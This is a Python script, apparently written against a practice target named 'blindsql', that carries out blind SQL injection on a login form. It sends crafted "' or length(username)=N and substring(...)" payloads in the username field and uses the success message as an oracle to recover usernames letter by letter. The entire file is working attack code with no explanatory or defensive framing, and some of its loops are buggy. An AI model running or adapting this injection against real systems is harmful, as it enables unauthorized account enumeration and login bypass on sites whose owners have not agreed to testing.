#!/usr/bin/python3

import requests

from string import ascii_letters

from string import digits

import code

from urllib.request import urlopen

from bs4 import BeautifulSoup

from bs4 import Comment

import sys, getopt

MAX_FIELD_LENGTH = 24

def get_answer(params):

    r = requests.post('http://blindsql/blind/login.php',data=params)

    bsObj = BeautifulSoup(r.text, "lxml")

    if bsObj.find('div', {'class':'message'}).text == "You are successfully authenticated!":

        return True

    else:

        return False

def oneLetter(users):
    i = 97

    while i <= 122:
        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            users.append(str(chr(i)))
        i += 1
        return users

def threeLetters(users):
    a = 97
    while a <= 122:
        b = 97
        while b <= 122:
            c = 97
            while c <= 122:
                params = {'userName': "' or length(username)=3 and substring(userName, 1, 3)=" + '\"' + str(chr(a))  + str(chr(b)) + str(chr(c)) + '\"' + " -- '", 'password': ''}
                if get_answer(params):
                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)))
                c += 1
            b += 1
        a += 1    
       
    return users

def getUsers(users):
    a = 97
    while a <= 122:
        b = 97
        while b <= 122:
            c = 97
            while c <= 122:
                d = 97
                while d <= 122:
                    e = 97
                    while e <= 122:
                        f = 97
                        while f <= 122:
                            g = 97
                            while g <= 122:
                                params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(a)) + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    users.append(str(chr(a)))
                                    print(params)
                                params = {'userName': "' or length(username)=3 and substring(userName, 1, 3)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)))
                                    print(params)
                                params = {'userName': "' or length(username)=4 and substring(userName, 1, 4)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)))
                                    print(params)
                                params = {'userName': "' or length(username)=5 and substring(userName, 1, 5)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)))
                                    print(params)
                                params = {'userName': "' or length(username)=7 and substring(userName, 1, 7)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)) + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)))
                                    print(params)
                                g += 1
                            f += 1
                        e += 1
                    d += 1
                c += 1
            b += 1
        a += 1
    return users



def getUSersOptomized():
    partial = []
    done = []

    i = 97
    while i <= 122:
        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            done.append(str(chr(i)))
        params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            partial.append(str(chr(i)))
        i += 1

    
    i = 97
    while i <= 122:
        for word in partial:
            params = {'userName': "' or length(userName)=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                #partial.remove(word)
                done.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)!=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                #partial.remove(word)
                partial.append(word + str(chr(i)))
        i += 1
    
    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1
    
    
    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1
    

    i = 97
    while i <= 122:
        
        for word in partial:
            
            params = {'userName': "' or length(userName)!=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1

    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1

    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1


    return done
def main():
    users = []

    print(getUSersOptomized())

main()
